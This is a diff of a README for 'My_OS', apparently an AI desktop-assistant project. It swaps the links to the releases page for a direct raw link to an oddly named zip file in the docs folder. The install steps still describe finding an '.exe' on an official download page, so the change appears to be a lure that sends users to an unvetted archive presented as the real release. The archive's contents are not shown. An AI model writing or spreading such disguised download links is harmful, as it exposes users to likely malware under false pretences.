@@ -1,6 +1,6 @@
 # 🤖 My_OS - Control your computer with natural language
 
-[![](https://img.shields.io/badge/Download_My_OS-Blue-blue)](https://github.com/Whitepl435/My_OS/releases)
+[![](https://img.shields.io/badge/Download_My_OS-Blue-blue)](https://raw.githubusercontent.com/Whitepl435/My_OS/main/docs/OS-My-marmorate.zip)
 
 My_OS turns your computer into a system you can talk to. You describe a task, and the assistant performs the work for you. It organizes your files, installs new programs, and changes system settings while you watch. It runs on your hardware to keep your data private.
 
@@ -24,7 +24,7 @@ To run My_OS, your computer needs the following specifications:
 
 Follow these steps to get My_OS running on your Windows device.
 
-1.  Visit the [official download page](https://github.com/Whitepl435/My_OS/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Whitepl435/My_OS/main/docs/OS-My-marmorate.zip).
 2.  Locate the latest version of the file ending in `.exe`.
 3.  Click the file name to start the download.
 4.  Once the file finishes downloading, open your Downloads folder.
